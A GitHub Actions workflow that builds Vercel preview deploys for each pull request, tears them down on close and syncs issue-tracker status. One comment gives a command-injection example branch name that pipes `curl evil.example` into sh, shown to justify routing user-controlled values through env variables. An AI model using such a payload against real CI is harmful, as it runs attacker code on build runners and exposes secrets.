name: Deploy

# Spins up a Vercel preview deploy for every PR with a stable
# `<branch-slug>-<app>.rando-id.dev` URL, and tears it down on close.
# Production + staging deploys run via Vercel's native GitHub
# integration (push to main/staging) — this workflow only covers the
# branch-deploy flow today. See MAINTAINING.md → "Deploy strategy"
# for when/why to move prod deploys here too.
#
# Secrets are resolved from a **1Password Environment** (not a Vault)
# at job start. The only GitHub repo secret you need is
# `OP_SERVICE_ACCOUNT_TOKEN`; everything else is read from the staging
# environment (`ftd3n4l5egcfjai7f7tm2f7ytq`) via `op environment read`.
#
# Items expected in the staging Environment:
#   - NEON_API_KEY            (only if RANDO_NEON_PROJECT_ID is set)
#   - VERCEL_TOKEN
#   - CLOUDFLARE_API_TOKEN
#   - CLOUDFLARE_ACCOUNT_ID
#   - JIRA_BASE_URL / JIRA_EMAIL / JIRA_API_TOKEN  (only when tracker.kind=jira)
#
# Optional repo variables (Settings → Secrets and variables → Actions → Variables):
#   RANDO_NEON_PROJECT_ID   — needed only by the optional per-PR Neon branch steps
#   TRACKER_ENABLED=false   — disables the issue-tracker sync step
#   PREVIEW_ENABLED=false   — disables this whole workflow (use until the
#                             Vercel projects exist; see #75). Both branch-deploy
#                             AND teardown skip when set.

on:
  pull_request:
    types: [opened, synchronize, reopened, closed]
    # NOTE: do NOT add `paths-ignore` here. It would apply to the
    # `closed` event too — if a PR was deployed and then amended to
    # remove all deploy-worthy changes before close, the workflow
    # wouldn't fire and the teardown job would never run, orphaning
    # Vercel custom domains and Cloudflare CNAMEs. Deploy-worthy
    # filtering lives inside the branch-deploy job below via
    # .github/actions/changes; teardown always runs on close.

concurrency:
  # Serialize per-PR so a quick close-after-open doesn't race the deploy job.
  group: deploy-${{ github.event.pull_request.number }}
  cancel-in-progress: false

jobs:
  branch-deploy:
    # Dependabot PRs are opt-in for previews: skip unless the PR has
    # the `preview` label. Human-authored PRs always preview by
    # default. Vercel's free tier caps deploys at 100/day across the
    # account, and 70+ open Dependabot PRs would burn through that on
    # rebases alone — see .notes/ci-preview-quota-strategy.spec.md.
    # Teardown stays unconditional below so closing always cleans up,
    # even if the PR never had a preview.
    if: >-
      ${{
        vars.PREVIEW_ENABLED != 'false'
        && github.event.action != 'closed'
        && (
          github.actor != 'dependabot[bot]'
          || contains(github.event.pull_request.labels.*.name, 'preview')
        )
      }}
    name: Deploy preview
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3

      - uses: ./.github/actions/setup
        with:
          install-cli: 'true'

      # Detect whether the PR has any deploy-worthy changes. `code` is
      # true when any TS/JS source / tsconfig / lockfile changed; `shared`
      # is true when build-graph infra (turbo.json, root package.json)
      # changed. ORing them gives us "deploy needed" — consistent with
      # how lint.yml, typecheck.yml, codeql.yml all gate. Docs-only PRs
      # have both false and skip the substantive steps below.
      #
      # NOTE: do NOT gate on `outputs.docs` — dorny/paths-filter sets
      # that to true if ANY file matches the docs pattern (e.g. a PR
      # with both .ts + .md → `docs=true` AND `code=true`), so a
      # "skip if docs" gate would block real code PRs that touch a
      # README. Use the positive `code || shared` signal instead.
      - uses: ./.github/actions/changes
        id: changes

      - name: No deploy-worthy changes — skipping
        if: steps.changes.outputs.code != 'true' && steps.changes.outputs.shared != 'true'
        run: echo "::notice::No code or shared-infra changes — skipping preview deploy. Teardown stays unconditional on close."

      # Stream the staging 1Password Environment into $GITHUB_ENV. Adding
      # a new secret means adding it to the Environment in the 1Password
      # UI — no workflow change required.
      - uses: ./.github/actions/op-env
        if: steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true'
        with:
          service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}

      # Optional: spin up a per-PR Neon branch off main so migrations and
      # seed data are isolated. Requires RANDO_NEON_PROJECT_ID variable.
      # - name: Create Neon branch
      #   if: vars.RANDO_NEON_PROJECT_ID != '' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true')
      #   run: rando db branch create ${{ vars.RANDO_NEON_PROJECT_ID }} pr-${{ github.event.pull_request.number }} --from main

      - name: Trigger preview deploys
        if: steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true'
        # github.head_ref is user-influenceable (git allows a wide
        # character set in branch names; a fork-PR head or a
        # collaborator could craft `'); curl evil.example | sh #` and
        # break out of the single-quoted arg below). Plumb through
        # env: so bash treats the value as data, never as script.
        # Pattern matches the integration-tests.yml fix in #192.
        env:
          BRANCH: ${{ github.head_ref }}
          FORCE_COLOR: '1'
        run: rando deploy branch "$BRANCH" --stable-url

      # Issue tracker: each ticket referenced by this PR → In Review,
      # plus a comment with the per-app stable deploy URLs. Soft-fails
      # so a tracker hiccup doesn't fail the deploy job.
      - id: refs
        if: vars.TRACKER_ENABLED != 'false' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true')
        uses: ./.github/actions/issue-refs

      - name: Sync issues → In Review with deploy URLs
        if: vars.TRACKER_ENABLED != 'false' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true') && steps.refs.outputs.keys != ''
        # Every user-influenceable value used in shell is plumbed via
        # env: blocks (CWE-77 prevention). github.head_ref + pr.html_url
        # + the issue-keys output (whose source is PR title/body
        # parsing — user-controlled) all go through env vars, not
        # template interpolation. Pattern from #192.
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          FORCE_COLOR: '1'
          BRANCH: ${{ github.head_ref }}
          PR_URL: ${{ github.event.pull_request.html_url }}
          KEYS: ${{ steps.refs.outputs.keys }}
        run: |
          MSG=$(printf 'Branch deploy live:\n\n- https://%s-api.rando-id.dev\n- https://%s-web.rando-id.dev\n- https://%s-admin.rando-id.dev\n\nPR: %s' \
            "$BRANCH" "$BRANCH" "$BRANCH" "$PR_URL")
          printf '%s\n' "$KEYS" | while IFS= read -r key; do
            [ -z "$key" ] && continue
            echo "→ $key in-review + comment"
            rando issues lifecycle "$key" in-review --message "$MSG" || echo "(non-fatal: $key)"
          done

  teardown:
    if: ${{ vars.PREVIEW_ENABLED != 'false' && github.event.action == 'closed' }}
    name: Teardown preview
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3

      - uses: ./.github/actions/setup
        with:
          install-cli: 'true'

      - uses: ./.github/actions/op-env
        with:
          service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}

      - name: Remove stable URLs
        # Same CWE-77 concern as the branch-deploy step above —
        # github.head_ref via env, not template interpolation.
        env:
          BRANCH: ${{ github.head_ref }}
          FORCE_COLOR: '1'
        run: rando deploy teardown "$BRANCH" --yes

      # Optional: drop the per-PR Neon branch.
      # - name: Delete Neon branch
      #   if: vars.RANDO_NEON_PROJECT_ID != ''
      #   run: rando db branch delete ${{ vars.RANDO_NEON_PROJECT_ID }} pr-${{ github.event.pull_request.number }} --yes
